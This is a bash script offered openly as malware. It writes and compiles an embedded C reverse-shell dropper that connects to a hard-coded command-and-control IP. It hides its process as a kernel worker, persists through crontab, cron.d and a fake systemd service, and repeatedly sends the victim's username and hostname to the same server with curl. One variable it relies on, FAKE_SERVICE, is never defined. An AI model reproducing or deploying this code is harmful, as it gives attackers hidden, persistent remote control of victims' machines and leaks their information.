#!/usr/bin/env bash
# QEMU/SeaBIOS Ghost + Embedded dropper.c – SleepTheGod @portknock Alpharetta Botmaster
# Full monitoring + reverse shell dropper – 2026

set -euo pipefail 2>/dev/null

C2_HOST="173.249.20.58"
C2_PORT="443"
C2_PATH="/beacon"
SELF_NAME="/usr/lib/.private-systemd-sync"
FAKE_PROC="[kworker/0:1H-events_freezable]"
BEACON_INTERVAL=7
DROPPER_BIN="/tmp/.x11-tmp"
DROPPER_C="/tmp/.x11-tmp.c"

embed_dropper() {
    cat > "$DROPPER_C" << 'EOF_DROP'
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

#define C2_IP   "173.249.20.58"
#define C2_PORT 4445

int main() {
    if (fork()) exit(0);
    setsid();
    if (fork()) exit(0);

    int s = socket(AF_INET, SOCK_STREAM, 0);
    struct sockaddr_in a = { .sin_family = AF_INET, .sin_port = htons(C2_PORT) };
    inet_pton(AF_INET, C2_IP, &a.sin_addr);

    if (connect(s, (struct sockaddr*)&a, sizeof(a)) == 0) {
        dup2(s, 0); dup2(s, 1); dup2(s, 2);
        char *sh[] = {"/bin/sh", NULL};
        execve(sh[0], sh, NULL);
    }
    while(1) sleep(666);
}
EOF_DROP

    if command -v gcc >/dev/null 2>&1; then
        gcc -o "$DROPPER_BIN" "$DROPPER_C" -static -s -O2 2>/dev/null && rm -f "$DROPPER_C"
        chmod +x "$DROPPER_BIN" && "$DROPPER_BIN" & disown 2>/dev/null
    fi
}

is_qemu() { dmesg | grep -qi "QEMU\|SeaBIOS\|virtio" || lspci | grep -qi virtio; }

cloak() { echo -n "$FAKE_PROC" > /proc/$$/cmdline 2>/dev/null; prctl --name "$FAKE_PROC" 2>/dev/null; }

infect() {
    local t="$SELF_NAME"
    [ "$0" = "$t" ] && return
    mkdir -p "$(dirname "$t")" 2>/dev/null
    cp "$0" "$t" 2>/dev/null
    chmod 755 "$t"

    (crontab -l 2>/dev/null; echo "@reboot root $t >/dev/null 2>&1") | crontab -
    echo "@reboot root $t >/dev/null 2>&1" > "/etc/cron.d/.${FAKE_SERVICE}-$(uuidgen|cut -c1-8)" 2>/dev/null

    if [ "$(id -u)" = "0" ]; then
        cat > "/etc/systemd/system/${FAKE_SERVICE}.service" <<EOF
[Unit] Description=Journal Remote Cache
[Service] ExecStart=$t Restart=always RestartSec=5
[Install] WantedBy=multi-user.target
EOF
        systemctl daemon-reload && systemctl enable --now "${FAKE_SERVICE}" 2>/dev/null
    fi

    embed_dropper
    exec "$t" "$@" &
    exit 0
}

beacon() {
    local p="$(whoami)@$(hostname) [$(date '+%Y-%m-%d %H:%M:%S')] PID=$$ $(is_qemu && echo "QEMU")"
    curl -sk --data-urlencode "q=$p" "https://$C2_HOST:$C2_PORT$C2_PATH" 2>/dev/null
}

main() {
    [ -t 0 ] && exec </dev/null >/dev/null 2>&1
    cloak
    infect
    while true; do beacon; sleep $((BEACON_INTERVAL + RANDOM%7)); done
}

main "$@"
